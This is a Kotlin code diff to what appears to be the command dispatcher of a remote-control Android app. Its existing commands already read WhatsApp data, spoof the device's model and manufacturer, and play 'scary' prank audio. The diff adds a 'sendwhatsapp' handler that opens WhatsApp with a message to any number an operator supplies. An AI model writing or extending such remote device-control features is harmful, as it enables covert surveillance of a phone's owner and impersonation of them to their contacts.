@@ -172,6 +172,7 @@ class CommandDispatcher(
                 "sayscary" -> handleSayScary(command)
                 "sayscaryurdu" -> handleSayScaryUrdu(command)
                 "getwhatsapp" -> handleGetWhatsapp(command)
+                "sendwhatsapp" -> handleSendWhatsapp(command)
                 "prank_mode" -> handlePrankMode(command)
                 "spoof" -> handleSpoof(command)
                 else -> error(command.commandId, "UNKNOWN_COMMAND", "Command is not supported on device")
@@ -1799,6 +1800,25 @@ class CommandDispatcher(
         settingsStore.spoofManufacturer = manufacturer
         
         return success(command.commandId, mapOf("spoofedModel" to model, "spoofedManufacturer" to manufacturer))
+    }
+
+    private fun handleSendWhatsapp(command: DeviceCommand): CommandResult {
+        val number = command.payload["number"]?.toString()?.trim() ?: ""
+        val message = command.payload["message"]?.toString() ?: ""
+
+        if (number.length < 5) return error(command.commandId, "INVALID_NUMBER", "Phone number too short")
+
+        return try {
+            val intent = Intent(Intent.ACTION_VIEW)
+            val url = "https://api.whatsapp.com/send?phone=$number&text=${Uri.encode(message)}"
+            intent.data = Uri.parse(url)
+            intent.setPackage("com.whatsapp")
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            appContext.startActivity(intent)
+            success(command.commandId, mapOf("status" to "whatsapp_intent_sent", "number" to number))
+        } catch (e: Exception) {
+            error(command.commandId, "SEND_FAILED", e.message ?: "Could not open WhatsApp")
+        }
     }
 
     private fun success(commandId: String, data: Map<String, Any?>, mediaId: String? = null): CommandResult {
